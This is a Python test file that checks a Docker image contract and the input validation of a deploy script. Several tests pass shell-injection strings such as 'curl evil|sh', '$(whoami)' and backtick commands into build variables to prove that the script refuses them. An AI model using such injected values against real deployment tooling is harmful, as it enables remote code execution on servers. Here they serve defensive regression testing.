"""Image-contract guard for E15-3a-BR-07 and BR-03 build-arg follow-up.

Two guards live here:

1. BR-07 guard: the deployed acx-backend image must include `scripts/`
   so operators can run `python -m scripts.manage_api_keys` inside the
   api container per the BR-02 task plan and `.env.prod.example`.
   Originally discovered in prod when
   `docker compose exec api python -m scripts.manage_api_keys` failed
   with `ModuleNotFoundError: No module named 'scripts'`.

2. BR-03 follow-up guard: the deployed image must carry its build-time
   git SHA in the `APP_GIT_COMMIT_SHA` environment variable so the
   runtime `/health` and `/version` endpoints (api/main.py) can surface
   a non-"unknown" commit_sha for the plugin-side probe and operator
   forensics. The runtime reader lives at api/main.py line ~70
   (`os.environ.get("APP_GIT_COMMIT_SHA", "")`). The producer side is
   this Dockerfile (`ARG GIT_COMMIT_SHA` + `ENV APP_GIT_COMMIT_SHA`)
   plus the operator deploy command (`docker build --build-arg
   GIT_COMMIT_SHA=$(git rev-parse HEAD) ...`) documented in
   infra/oci/README.md. Without both halves the health-payload ships
   `commit_sha: "unknown"` and BR-03's /version surface provides no
   value to the plugin backend_too_old probe.

Stage awareness (ORCH-LAUNCH-01-S1-RA-05): BuildKit builds the *last*
named stage when ``--target`` is omitted. Package-contract claims are
scoped to the default ``runtime`` stage's *effective* body (follows
``FROM <named-stage>`` inheritance so shared layers in ``runtime-base``
still satisfy the contract), and the script fails closed when the last
stage is not ``runtime`` (so a silent flip to ``runtime-vlm`` cannot go
green).

Parser source (GATE-BR-01 / wave-3): the multi-stage Dockerfile parser
lives in ``recognition/tests/dockerfile_stages.py``. This script imports
that shared module (with a small sys.path bootstrap so it runs from the
repo root without installing the service package). Do not reintroduce a
local ``_FROM_RE`` duplicate.
"""

from __future__ import annotations

import os
import pathlib
import re
import shutil
import subprocess
import sys
import textwrap

REPO_ROOT = pathlib.Path(__file__).resolve().parents[1]
DOCKERFILE = REPO_ROOT / "apps" / "prototype-description-service" / "Dockerfile"
SCRIPTS_DIR = REPO_ROOT / "apps" / "prototype-description-service" / "scripts"
OCI_README = REPO_ROOT / "infra" / "oci" / "README.md"
DEPLOY_SCRIPT = REPO_ROOT / "scripts" / "deploy" / "recognition-service.sh"
_SERVICE_ROOT = REPO_ROOT / "apps" / "prototype-description-service"
_TESTS_PARENT = _SERVICE_ROOT  # recognition is importable when service root is on path

DEFAULT_RUNTIME_STAGE = "runtime"

COPY_SCRIPTS = re.compile(r"^COPY\s+scripts/\s+scripts/\s*$", re.MULTILINE)
ARG_GIT_SHA = re.compile(r"^ARG\s+GIT_COMMIT_SHA\b", re.MULTILINE)
ENV_APP_GIT_SHA = re.compile(
    r"^ENV\s+APP_GIT_COMMIT_SHA\s*=\s*\$\{?GIT_COMMIT_SHA\}?\s*$",
    re.MULTILINE,
)
README_BUILD_ARG = re.compile(
    r"docker\s+build(?:[^\n]|\\\n)*--build-arg\s+GIT_COMMIT_SHA=",
)


def _ensure_shared_parser_importable() -> None:
    """Put the service root on sys.path so recognition.tests.dockerfile_stages imports."""
    service = str(_SERVICE_ROOT)
    if service not in sys.path:
        sys.path.insert(0, service)


_ensure_shared_parser_importable()

from recognition.tests.dockerfile_stages import (  # noqa: E402
    default_build_target,
    dockerfile_stages,
    effective_stage_body,
)


def assert_default_target_is_runtime(dockerfile: pathlib.Path = DOCKERFILE) -> None:
    stages = dockerfile_stages(dockerfile)
    assert stages, f"expected named build stages in {dockerfile}"
    last = default_build_target(dockerfile)
    assert last == DEFAULT_RUNTIME_STAGE, (
        f"last Dockerfile stage is {last!r}, so a bare `docker build` would "
        f"build it. {DEFAULT_RUNTIME_STAGE!r} must stay last or production "
        "ships the non-default (e.g. torch-bearing) image "
        "(ORCH-LAUNCH-01-S1-RA-05 / BR-01)."
    )


def assert_runtime_copies_scripts(dockerfile: pathlib.Path = DOCKERFILE) -> None:
    stages = dockerfile_stages(dockerfile)
    assert DEFAULT_RUNTIME_STAGE in stages, (
        f"Dockerfile missing {DEFAULT_RUNTIME_STAGE!r} stage; have {list(stages)}"
    )
    body = effective_stage_body(dockerfile, DEFAULT_RUNTIME_STAGE)
    assert COPY_SCRIPTS.search(body), (
        "runtime stage (effective body) must contain `COPY scripts/ scripts/` so "
        "the operator CLI (scripts/manage_api_keys.py) is reachable in the "
        "deployed image. Without it, `python -m scripts.manage_api_keys` fails "
        "with ModuleNotFoundError in production (E15-3a-BR-07). Stage-scoped + "
        "inheritance-aware: a COPY only in another non-ancestor stage does not "
        "satisfy this contract (ORCH-LAUNCH-01-S1-RA-05 / wave-2)."
    )


def assert_runtime_declares_git_commit_sha_build_arg(
    dockerfile: pathlib.Path = DOCKERFILE,
) -> None:
    body = effective_stage_body(dockerfile, DEFAULT_RUNTIME_STAGE)
    assert ARG_GIT_SHA.search(body), (
        "runtime stage (effective body) must declare `ARG GIT_COMMIT_SHA` so "
        "operators can pass --build-arg GIT_COMMIT_SHA=$(git rev-parse HEAD) at "
        "build time. Without it the runtime image cannot surface a real "
        "commit_sha via /health or /version and the BR-03 plugin probe is blind "
        "(E15-3a-BR-03 follow-up)."
    )


def assert_runtime_exports_app_git_commit_sha_env(
    dockerfile: pathlib.Path = DOCKERFILE,
) -> None:
    body = effective_stage_body(dockerfile, DEFAULT_RUNTIME_STAGE)
    assert ENV_APP_GIT_SHA.search(body), (
        "runtime stage (effective body) must contain "
        "`ENV APP_GIT_COMMIT_SHA=${GIT_COMMIT_SHA}` so api/main.py's "
        "os.environ.get('APP_GIT_COMMIT_SHA') reader returns the build-time "
        "SHA instead of falling back to 'unknown' (E15-3a-BR-03 follow-up)."
    )


def assert_manage_api_keys_module_exists() -> None:
    cli = SCRIPTS_DIR / "manage_api_keys.py"
    assert cli.is_file(), f"expected {cli} to exist"


def assert_oci_readme_passes_git_commit_sha_build_arg() -> None:
    text = OCI_README.read_text(encoding="utf-8")
    assert README_BUILD_ARG.search(text), (
        "infra/oci/README.md deploy instructions must show `docker build "
        "--build-arg GIT_COMMIT_SHA=$(git rev-parse HEAD) ...` so operators "
        "actually populate the build-time SHA. The Dockerfile ARG is inert "
        "without a matching operator-side producer (E15-3a-BR-03 follow-up)."
    )


def run_contract_checks(dockerfile: pathlib.Path = DOCKERFILE) -> None:
    """Run all image-contract assertions; raise AssertionError on failure."""
    assert_default_target_is_runtime(dockerfile)
    assert_runtime_copies_scripts(dockerfile)
    assert_manage_api_keys_module_exists()
    assert_runtime_declares_git_commit_sha_build_arg(dockerfile)
    assert_runtime_exports_app_git_commit_sha_env(dockerfile)
    assert_oci_readme_passes_git_commit_sha_build_arg()


def main(argv: list[str] | None = None) -> int:
    """CLI entrypoint: optional Dockerfile path as argv[1]. Exit 0 on pass, 1 on fail."""
    args = list(sys.argv[1:] if argv is None else argv)
    dockerfile = pathlib.Path(args[0]) if args else DOCKERFILE
    try:
        # README + manage_api_keys checks use fixed repo paths; only Dockerfile
        # assertions are path-parameterized for synthetic negative tests.
        assert_default_target_is_runtime(dockerfile)
        assert_runtime_copies_scripts(dockerfile)
        assert_runtime_declares_git_commit_sha_build_arg(dockerfile)
        assert_runtime_exports_app_git_commit_sha_env(dockerfile)
        if dockerfile.resolve() == DOCKERFILE.resolve():
            assert_manage_api_keys_module_exists()
            assert_oci_readme_passes_git_commit_sha_build_arg()
    except AssertionError as exc:
        print(f"FAIL: {exc}", file=sys.stderr)
        return 1
    print(f"OK: image contract holds for {dockerfile}")
    return 0


# ---- pytest surface (same checks; path-parameterized negatives below) ----


def test_dockerfile_default_target_is_runtime() -> None:
    assert_default_target_is_runtime()


def test_dockerfile_copies_scripts_into_runtime() -> None:
    assert_runtime_copies_scripts()


def test_manage_api_keys_module_exists_at_expected_path() -> None:
    assert_manage_api_keys_module_exists()


def test_dockerfile_declares_git_commit_sha_build_arg() -> None:
    assert_runtime_declares_git_commit_sha_build_arg()


def test_dockerfile_exports_app_git_commit_sha_env() -> None:
    assert_runtime_exports_app_git_commit_sha_env()


def test_oci_readme_deploy_command_passes_git_commit_sha_build_arg() -> None:
    assert_oci_readme_passes_git_commit_sha_build_arg()


def test_guard_bites_when_default_target_is_runtime_vlm(tmp_path: pathlib.Path) -> None:
    """RA-05 mutation (a): last stage runtime-vlm must fail the contract."""
    df = tmp_path / "Dockerfile"
    df.write_text(
        "FROM python:3.12-slim AS runtime\n"
        "COPY scripts/ scripts/\n"
        "ARG GIT_COMMIT_SHA=unknown\n"
        "ENV APP_GIT_COMMIT_SHA=${GIT_COMMIT_SHA}\n"
        "\n"
        "FROM python:3.12-slim AS runtime-vlm\n"
        "COPY scripts/ scripts/\n"
        "ARG GIT_COMMIT_SHA=unknown\n"
        "ENV APP_GIT_COMMIT_SHA=${GIT_COMMIT_SHA}\n",
        encoding="utf-8",
    )
    # Whole-file patterns would still match COPY/ARG/ENV anywhere.
    whole = df.read_text(encoding="utf-8")
    assert COPY_SCRIPTS.search(whole)
    assert ARG_GIT_SHA.search(whole)
    assert ENV_APP_GIT_SHA.search(whole)

    assert main([str(df)]) != 0, (
        "contract must exit non-zero when last stage is runtime-vlm"
    )


def test_guard_bites_when_scripts_copy_only_in_non_default_stage(
    tmp_path: pathlib.Path,
) -> None:
    """RA-05: scripts COPY only in runtime-vlm must not satisfy the runtime contract."""
    df = tmp_path / "Dockerfile"
    df.write_text(
        "FROM python:3.12-slim AS runtime-vlm\n"
        "COPY scripts/ scripts/\n"
        "ARG GIT_COMMIT_SHA=unknown\n"
        "ENV APP_GIT_COMMIT_SHA=${GIT_COMMIT_SHA}\n"
        "\n"
        "FROM python:3.12-slim AS runtime\n"
        "ARG GIT_COMMIT_SHA=unknown\n"
        "ENV APP_GIT_COMMIT_SHA=${GIT_COMMIT_SHA}\n",
        encoding="utf-8",
    )
    whole = df.read_text(encoding="utf-8")
    assert COPY_SCRIPTS.search(whole), "control: whole-file would stay green"
    assert main([str(df)]) != 0


def test_effective_body_accepts_scripts_copy_from_runtime_base(
    tmp_path: pathlib.Path,
) -> None:
    """Wave-2: COPY scripts/ in runtime-base must satisfy the runtime contract."""
    df = tmp_path / "Dockerfile"
    df.write_text(
        "FROM python:3.12-slim AS runtime-base\n"
        "COPY scripts/ scripts/\n"
        "ARG GIT_COMMIT_SHA=unknown\n"
        "ENV APP_GIT_COMMIT_SHA=${GIT_COMMIT_SHA}\n"
        "\n"
        "FROM runtime-base AS runtime\n"
        "ENV ACX_IMAGE_VARIANT=recognition\n",
        encoding="utf-8",
    )
    # Own body alone would miss the COPY — effective body must pass.
    own = dockerfile_stages(df)[DEFAULT_RUNTIME_STAGE]
    assert not COPY_SCRIPTS.search(own)
    assert main([str(df)]) == 0


# ---- ORCH-LAUNCH-01 wave-4 lane B: deploy-script security (D1) ------------


def _assert_safe_shell_token_body() -> str:
    """Extract assert_safe_shell_token from the deploy script."""
    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
    m = re.search(
        r"assert_safe_shell_token\(\)\s*\{(?P<body>.*?)\n\}",
        script,
        re.DOTALL,
    )
    assert m, "assert_safe_shell_token must exist (D1 charset gate)"
    return m.group("body")


def _probe_build_target(target: str) -> subprocess.CompletedProcess[str]:
    """Run the real charset gate against ACX_BUILD_TARGET (no full deploy script)."""
    body = _assert_safe_shell_token_body()
    probe = textwrap.dedent(
        f"""\
        #!/usr/bin/env bash
        set -euo pipefail
        fail() {{ printf '%s\\n' "$*" >&2; exit 1; }}
        assert_safe_shell_token() {{
        {body}
        }}
        ACX_BUILD_TARGET={target!r}
        assert_safe_shell_token "ACX_BUILD_TARGET" "${{ACX_BUILD_TARGET}}"
        echo ACCEPTED
        """
    )
    return subprocess.run(
        ["bash", "-c", probe],
        check=False,
        capture_output=True,
        text=True,
    )


def test_d1_acx_build_target_charset_gate_exists() -> None:
    """D1 structural: charset allowlist + ingestion-time validation present."""
    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
    assert "assert_safe_shell_token" in script
    # `/` allowed so ACX_REMOTE_BUILD_DIR shares this gate (path-safe, not a shell metachar).
    assert re.search(r"\[A-Za-z0-9_\./\-\]\+", script) or re.search(
        r"\[A-Za-z0-9_./\-\]\+", script
    )
    assert "assert_safe_shell_token \"ACX_BUILD_TARGET\"" in script
    assert "assert_safe_shell_token \"ACX_REMOTE_BUILD_DIR\"" in script
    assert "assert_safe_image_repo" in script


def test_d1_rejects_metacharacter_build_target() -> None:
    """D1 / TEST-15: shell metacharacters in ACX_BUILD_TARGET must be refused.

    Proven RED against the pre-fix script (no assert_safe_shell_token; evil
    value flowed into resolve_image_repo_name → ACX_IMAGE_REPO → single-quoted
    ssh fragment in ship_remote_image_repo_env and executed on the VM).
    """
    evil_values = [
        "x';curl evil|sh;'",
        "runtime-vlm;id",
        "foo$(whoami)",
        "bar`id`",
        "baz|tee",
        "qux&bg",
        "a b",
        "a\nb",
    ]
    for target in evil_values:
        result = _probe_build_target(target)
        assert result.returncode != 0, (
            f"D1: expected refuse for metachar target {target!r}, got ACCEPTED: "
            f"stdout={result.stdout!r} stderr={result.stderr!r}"
        )
        combined = (result.stdout or "") + (result.stderr or "")
        assert "charset" in combined.lower() or "refusing" in combined.lower(), (
            f"error must name charset refusal for {target!r}: {combined}"
        )

    # Legitimate charset values still accepted by the token gate (enum is separate).
    for target in ("", "runtime", "runtime-vlm", "builder", "foo_bar.1-2", "/tmp/acx-build"):
        result = _probe_build_target(target)
        assert result.returncode == 0, (
            f"legitimate target {target!r} must pass: {result.stderr}"
        )
        assert "ACCEPTED" in (result.stdout or "")


def test_d1_full_script_refuses_evil_build_target_at_ingestion() -> None:
    """Sourcing/executing the deploy script with an evil ACX_BUILD_TARGET exits."""
    evil = "x';curl evil|sh;'"
    env = os.environ.copy()
    env["ACX_BUILD_TARGET"] = evil
    proc = subprocess.run(
        ["bash", str(DEPLOY_SCRIPT), "help"],
        check=False,
        capture_output=True,
        text=True,
        env=env,
        timeout=15,
    )
    assert proc.returncode != 0, (
        f"deploy script must refuse evil ACX_BUILD_TARGET at ingestion; "
        f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
    )
    combined = (proc.stdout or "") + (proc.stderr or "")
    assert "charset" in combined.lower() or "refusing" in combined.lower()


def test_d1_remote_build_dir_injection_refused_before_ssh(tmp_path: pathlib.Path) -> None:
    """S2-A-01 / TEST-15: evil ACX_REMOTE_BUILD_DIR must not reach ssh argv.

    Executes the real deploy script with a PATH-stubbed ssh that logs every
    argv payload. The injection payload from the adversarial review
    (``/tmp/acx-build; curl http://evil/x | sh; #``) must fail closed at
    ingestion — ssh must never be invoked with that string.
    """
    bindir = tmp_path / "bin"
    bindir.mkdir()
    ssh_log = tmp_path / "ssh.log"
    ssh_log.write_text("")
    (bindir / "ssh").write_text(
        "#!/bin/sh\n"
        f'printf "%s\\n" "$*" >> "{ssh_log}"\n'
        "exit 0\n"
    )
    (bindir / "ssh").chmod(0o755)
    # Also stub docker/rsync so a regression that reaches further still can't touch a host.
    (bindir / "docker").write_text("#!/bin/sh\nexit 0\n")
    (bindir / "docker").chmod(0o755)
    (bindir / "rsync").write_text("#!/bin/sh\nexit 0\n")
    (bindir / "rsync").chmod(0o755)

    evil = "/tmp/acx-build; curl http://evil/x | sh; #"
    env = os.environ.copy()
    env["PATH"] = f"{bindir}:{env['PATH']}"
    env["ACX_REMOTE_BUILD_DIR"] = evil
    env["REMOTE_BUILD"] = "1"
    proc = subprocess.run(
        ["bash", str(DEPLOY_SCRIPT), "help"],
        check=False,
        capture_output=True,
        text=True,
        env=env,
        timeout=15,
    )
    assert proc.returncode != 0, (
        f"evil ACX_REMOTE_BUILD_DIR must fail at ingestion; "
        f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
    )
    combined = (proc.stdout or "") + (proc.stderr or "")
    assert "ACX_REMOTE_BUILD_DIR" in combined or "charset" in combined.lower()
    # ssh must not have been invoked at all (ingestion fails before dispatch).
    assert ssh_log.read_text() == "", f"ssh was invoked with: {ssh_log.read_text()!r}"

    # Legitimate default path is accepted at ingestion (help exits 0).
    env2 = os.environ.copy()
    env2["PATH"] = f"{bindir}:{env2['PATH']}"
    env2["ACX_REMOTE_BUILD_DIR"] = "/tmp/acx-build"
    proc2 = subprocess.run(
        ["bash", str(DEPLOY_SCRIPT), "help"],
        check=False,
        capture_output=True,
        text=True,
        env=env2,
        timeout=15,
    )
    assert proc2.returncode == 0, proc2.stderr


def test_d1_remote_build_dir_quoted_at_ssh_sink(tmp_path: pathlib.Path) -> None:
    """S2-A-01: validated REMOTE_BUILD_DIR is single-quoted in the mkdir/cd sinks.

    Executes do_build_remote with stubs so the real ssh command strings are captured.
    """
    bindir = tmp_path / "bin"
    bindir.mkdir()
    ssh_log = tmp_path / "ssh.log"
    ssh_log.write_text("")
    # ssh stub: log remote command payload (last arg) and succeed for preflight checks.
    (bindir / "ssh").write_text(
        textwrap.dedent(
            f"""\
            #!/bin/sh
            # Log every remote command string (last argv) for sink inspection.
            for a in "$@"; do last="$a"; done
            printf '%s\\n' "$last" >> "{ssh_log}"
            # Free-space preflight parses df output from a remote command.
            case "$last" in
              *df*) echo 20 ;;
            esac
            exit 0
            """
        )
    )
    (bindir / "ssh").chmod(0o755)
    (bindir / "rsync").write_text("#!/bin/sh\nexit 0\n")
    (bindir / "rsync").chmod(0o755)
    (bindir / "docker").write_text("#!/bin/sh\nexit 0\n")
    (bindir / "docker").chmod(0o755)

    safe_dir = "/tmp/acx-build-safe"
    env = os.environ.copy()
    env["PATH"] = f"{bindir}:{env['PATH']}"
    env["ACX_REMOTE_BUILD_DIR"] = safe_dir
    env["REMOTE_BUILD"] = "1"
    # Source and call do_build_remote with preflight stubs that still exercise ssh sinks.
    script = textwrap.dedent(
        f"""\
        source "{DEPLOY_SCRIPT}"
        preflight_ssh() {{ :; }}
        preflight_remote_docker() {{ :; }}
        preflight_rsync() {{ :; }}
        remote_builder_prune() {{ :; }}
        # assert_remote_build_free_space uses ssh; leave real so sink log captures it too,
        # but override to skip the numeric gate if parse fails.
        assert_remote_build_free_space() {{ :; }}
        do_build_remote dev
        """
    )
    proc = subprocess.run(
        ["bash", "-c", script],
        check=False,
        capture_output=True,
        text=True,
        env=env,
        timeout=30,
    )
    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
    payloads = ssh_log.read_text()
    # OCIRV-1 fences each deploy into its own generation directory
    # (`${REMOTE_BUILD_DIR}-<sha12>-<epoch>-<pid>-<random>`) so one coordinator's
    # `rsync --delete` cannot rewrite another's build context. D1's contract is the
    # *quoting at the ssh sink*, not the literal directory name, so pin the quoted
    # form and tolerate the generation suffix.
    gen_dir = re.escape(safe_dir) + r"[A-Za-z0-9._/-]*"
    assert re.search(rf"mkdir -p -- '{gen_dir}'", payloads), payloads
    assert re.search(rf"cd -- '{gen_dir}'", payloads), payloads
    assert re.search(rf"rm -rf -- '{gen_dir}'", payloads), payloads
    # Every occurrence of the build dir (generation dir, and the `.lock` sibling
    # derived from REMOTE_BUILD_DIR) must be single-quoted at the sink; an unquoted
    # occurrence is the original injection regression.
    occurrences = [m.start() for m in re.finditer(re.escape(safe_dir), payloads)]
    assert occurrences, payloads
    for start in occurrences:
        assert start > 0 and payloads[start - 1] == "'", payloads
        token = payloads[start : payloads.index("'", start)]
        assert re.fullmatch(rf"{gen_dir}", token), token


def test_d8_variant_vlm_without_vlm_target_fails_closed() -> None:
    """D8 build-half: ACX_IMAGE_VARIANT=vlm + non-*vlm* target is refused."""
    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
    assert "ACX_IMAGE_VARIANT=vlm requires ACX_BUILD_TARGET matching *vlm*" in script
    env = os.environ.copy()
    env["ACX_IMAGE_VARIANT"] = "vlm"
    env["ACX_BUILD_TARGET"] = "runtime"
    proc = subprocess.run(
        ["bash", str(DEPLOY_SCRIPT), "help"],
        check=False,
        capture_output=True,
        text=True,
        env=env,
        timeout=15,
    )
    assert proc.returncode != 0
    combined = (proc.stdout or "") + (proc.stderr or "")
    assert "ACX_IMAGE_VARIANT=vlm" in combined


def test_d8_case_and_enum_fail_closed() -> None:
    """S2-A-03 / D8: case-bypass and non-enum values must be refused at ingestion.

    Executes the real script (not a source grep). Reviewer proof vectors:
    - ACX_IMAGE_VARIANT=VLM ACX_BUILD_TARGET=runtime  (case bypass → was exit 0)
    - ACX_BUILD_TARGET=Runtime-Vlm  (must fold before the VLM-sized remote gate)
    - ACX_IMAGE_VARIANT=vlm2 / ACX_BUILD_TARGET=bogus  (no enum → was accepted)
    """
    # Fail-closed vectors (ingestion / help). Runtime-Vlm alone folds to runtime-vlm and
    # is a valid enum member for help — its remote-build gate is covered separately.
    fail_cases = [
        {"ACX_IMAGE_VARIANT": "VLM", "ACX_BUILD_TARGET": "runtime"},
        {"ACX_IMAGE_VARIANT": "vlm2"},
        {"ACX_BUILD_TARGET": "bogus"},
        {"ACX_IMAGE_VARIANT": "BOGUS"},
    ]
    for overrides in fail_cases:
        env = os.environ.copy()
        env.update(overrides)
        proc = subprocess.run(
            ["bash", str(DEPLOY_SCRIPT), "help"],
            check=False,
            capture_output=True,
            text=True,
            env=env,
            timeout=15,
        )
        assert proc.returncode != 0, (
            f"expected refuse for {overrides!r}; "
            f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
        )

    # Case-normalised legitimate pair still accepted.
    env_ok = os.environ.copy()
    env_ok["ACX_BUILD_TARGET"] = "Runtime"
    env_ok["ACX_IMAGE_VARIANT"] = "Recognition"
    proc_ok = subprocess.run(
        ["bash", str(DEPLOY_SCRIPT), "help"],
        check=False,
        capture_output=True,
        text=True,
        env=env_ok,
        timeout=15,
    )
    assert proc_ok.returncode == 0, proc_ok.stderr

    # Uppercase VLM + Runtime-Vlm: both fold lower → vlm + runtime-vlm → OK at ingestion.
    env_vlm = os.environ.copy()
    env_vlm["ACX_IMAGE_VARIANT"] = "VLM"
    env_vlm["ACX_BUILD_TARGET"] = "Runtime-Vlm"
    proc_vlm = subprocess.run(
        ["bash", str(DEPLOY_SCRIPT), "help"],
        check=False,
        capture_output=True,
        text=True,
        env=env_vlm,
        timeout=15,
    )
    assert proc_vlm.returncode == 0, proc_vlm.stderr


def _script_constant(name: str) -> int:
    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
    match = re.search(rf"^{re.escape(name)}=([0-9]+)$", script, re.MULTILINE)
    assert match, f"{name} must be a numeric shell constant"
    return int(match.group(1))


def _run_remote_space_gate(
    target: str,
    probe_output: str,
    probe_rc: int = 0,
) -> subprocess.CompletedProcess[str]:
    """Run the real free-space selector with a deterministic probe result."""
    env = os.environ.copy()
    env.update(
        {
            "ACX_BUILD_TARGET": target,
            "ACX_IMAGE_VARIANT": "",
            "TEST_REMOTE_PROBE_OUTPUT": probe_output,
            "TEST_REMOTE_PROBE_RC": str(probe_rc),
        }
    )
    script = textwrap.dedent(
        f"""\
        source "{DEPLOY_SCRIPT}"
        run_with_deadline() {{
            printf '%s' "${{TEST_REMOTE_PROBE_OUTPUT}}"
            return "${{TEST_REMOTE_PROBE_RC}}"
        }}
        assert_remote_build_free_space
        """
    )
    return subprocess.run(
        ["bash", "-c", script],
        check=False,
        capture_output=True,
        text=True,
        env=env,
        timeout=15,
    )


def test_remote_vlm_build_is_permitted_at_vlm_free_space_floor() -> None:
    """VLM remote builds pass when the measured VLM-sized floor is available."""
    vlm_floor = _script_constant("REMOTE_VLM_BUILD_MIN_FREE_GB")
    assert vlm_floor == 24
    proc = _run_remote_space_gate("runtime-vlm", str(vlm_floor))
    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
    assert f"need {vlm_floor}GB" in (proc.stdout or "")


def test_remote_vlm_build_refuses_space_between_recognition_and_vlm_floors() -> None:
    """A VLM target must not fall back to the smaller recognition floor."""
    recognition_floor = _script_constant("REMOTE_BUILD_MIN_FREE_GB")
    vlm_floor = _script_constant("REMOTE_VLM_BUILD_MIN_FREE_GB")
    assert vlm_floor > recognition_floor
    observed = vlm_floor - 1
    proc = _run_remote_space_gate("runtime-vlm", str(observed))
    assert proc.returncode != 0
    combined = (proc.stdout or "") + (proc.stderr or "")
    assert f"target runtime-vlm" in combined
    assert f"at least {vlm_floor}GB" in combined
    assert f"observed {observed}GB" in combined


def test_remote_non_vlm_build_stays_at_recognition_free_space_floor() -> None:
    """Non-VLM targets retain the recognition floor rather than the VLM budget."""
    recognition_floor = _script_constant("REMOTE_BUILD_MIN_FREE_GB")
    proc = _run_remote_space_gate("runtime", str(recognition_floor - 1))
    assert proc.returncode != 0
    combined = (proc.stdout or "") + (proc.stderr or "")
    assert f"target runtime" in combined
    assert f"at least {recognition_floor}GB" in combined
    assert f"observed {recognition_floor - 1}GB" in combined


def test_remote_free_space_probe_failure_is_fail_closed() -> None:
    """Failed and unparseable remote probes must not allow a build to proceed."""
    vlm_floor = _script_constant("REMOTE_VLM_BUILD_MIN_FREE_GB")
    for probe_output, probe_rc in (("not-a-number", 0), ("", 255)):
        proc = _run_remote_space_gate("runtime-vlm", probe_output, probe_rc)
        assert proc.returncode != 0
        combined = (proc.stdout or "") + (proc.stderr or "")
        assert "target runtime-vlm" in combined
        assert f"at least {vlm_floor}GB" in combined
        assert "free-space probe failed" in combined
        assert "observed" in combined


def test_d8_remote_build_uses_vlm_gate_after_case_fold(tmp_path: pathlib.Path) -> None:
    """Runtime-Vlm must take the VLM-sized gate after ingestion case folding."""
    bindir = tmp_path / "bin"
    bindir.mkdir()
    ssh_log = tmp_path / "ssh.log"
    (bindir / "ssh").write_text(
        textwrap.dedent(
            f"""\
            #!/bin/sh
            for a in "$@"; do last="$a"; done
            printf '%s\\n' "$last" >> "{ssh_log}"
            case "$last" in
              *df*) echo {_script_constant("REMOTE_VLM_BUILD_MIN_FREE_GB")} ;;
            esac
            exit 0
            """
        )
    )
    (bindir / "ssh").chmod(0o755)
    (bindir / "rsync").write_text("#!/bin/sh\nexit 0\n")
    (bindir / "rsync").chmod(0o755)
    env = os.environ.copy()
    env["PATH"] = f"{bindir}:{env['PATH']}"
    env["ACX_BUILD_TARGET"] = "Runtime-Vlm"
    env["REMOTE_BUILD"] = "1"
    script = textwrap.dedent(
        f"""\
        source "{DEPLOY_SCRIPT}"
        preflight_ssh() {{ :; }}
        preflight_remote_docker() {{ :; }}
        preflight_rsync() {{ :; }}
        do_build_remote dev
        """
    )
    proc = subprocess.run(
        ["bash", "-c", script],
        check=False,
        capture_output=True,
        text=True,
        env=env,
        timeout=15,
    )
    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
    combined = (proc.stdout or "") + (proc.stderr or "")
    vlm_floor = _script_constant("REMOTE_VLM_BUILD_MIN_FREE_GB")
    assert f"need {vlm_floor}GB" in combined
    assert "target=runtime-vlm" in combined
    payloads = ssh_log.read_text()
    assert payloads.index("docker builder prune") < payloads.index("df -BG")


def _assert_safe_image_repo_body() -> str:
    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
    m = re.search(
        r"assert_safe_image_repo\(\)\s*\{(?P<body>.*?)\n\}",
        script,
        re.DOTALL,
    )
    assert m, "assert_safe_image_repo must exist"
    return m.group("body")


def _probe_image_repo(value: str) -> subprocess.CompletedProcess[str]:
    """Execute the real assert_safe_image_repo body against a candidate repo path."""
    body = _assert_safe_image_repo_body()
    probe = textwrap.dedent(
        f"""\
        #!/usr/bin/env bash
        set -euo pipefail
        fail() {{ printf '%s\\n' "$*" >&2; exit 1; }}
        assert_safe_image_repo() {{
        {body}
        }}
        assert_safe_image_repo "ACX_IMAGE_REPO" {value!r}
        echo ACCEPTED
        """
    )
    return subprocess.run(
        ["bash", "-c", probe],
        check=False,
        capture_output=True,
        text=True,
    )


def test_assert_safe_image_repo_refuses_evil_and_accepts_ocir() -> None:
    """S2-A-11 / TEST-15: assert_safe_image_repo is executable, not a spelling check.

    Mutating the real function to ``return 0`` must turn this red (charset refuse
    path is the only thing keeping evil OCIR paths out of ship_remote ssh strings).
    """
    evil = [
        "iad.ocir.io/ns/acx; curl evil|sh",
        "repo$(whoami)",
        "repo`id`",
        "repo|tee",
        "repo&bg",
        "repo with spaces",
        "",
    ]
    for value in evil:
        result = _probe_image_repo(value)
        assert result.returncode != 0, (
            f"assert_safe_image_repo must refuse {value!r}; "
            f"stdout={result.stdout!r} stderr={result.stderr!r}"
        )
    ok = _probe_image_repo("iad.ocir.io/idu2kqqe2jxy/acx-backend")
    assert ok.returncode == 0, ok.stderr
    assert "ACCEPTED" in (ok.stdout or "")
    ok_vlm = _probe_image_repo("iad.ocir.io/idu2kqqe2jxy/acx-backend-vlm")
    assert ok_vlm.returncode == 0, ok_vlm.stderr


def test_d4_boot_smoke_emits_real_entrypoint_and_cache_mount(
    tmp_path: pathlib.Path,
) -> None:
    """D4 behavioural: do_boot_smoke Gate 2 uses real CMD + /data/cache:ro mounts.

    Stubs ssh to capture the remote payload (including the SMOKE heredoc). Asserts
    on the emitted command, not source spelling of do_boot_smoke.
    """
    bindir = tmp_path / "bin"
    bindir.mkdir()
    ssh_log = tmp_path / "ssh.log"
    ssh_log.write_text("")
    # OCIRV-1: the boot smoke only accepts an immutable, digest-pinned candidate
    # (`IMAGE_BASE@sha256:<64 hex>`); a mutable tag is refused before Gate 1. Pin
    # OCIR_NAMESPACE so IMAGE_BASE matches the fixture ref exactly.
    smoke_digest = "sha256:" + ("ab" * 32)
    assert len(smoke_digest.split(":", 1)[1]) == 64
    smoke_image = f"iad.ocir.io/ns/acx-backend@{smoke_digest}"
    # Log argv + drain stdin (heredoc body) into the same capture file.
    (bindir / "ssh").write_text(
        textwrap.dedent(
            f"""\
            #!/bin/sh
            printf 'ARGV:%s\\n' "$*" >> "{ssh_log}"
            if [ ! -t 0 ]; then
              printf 'STDIN:' >> "{ssh_log}"
              cat >> "{ssh_log}"
              printf '\\n' >> "{ssh_log}"
            fi
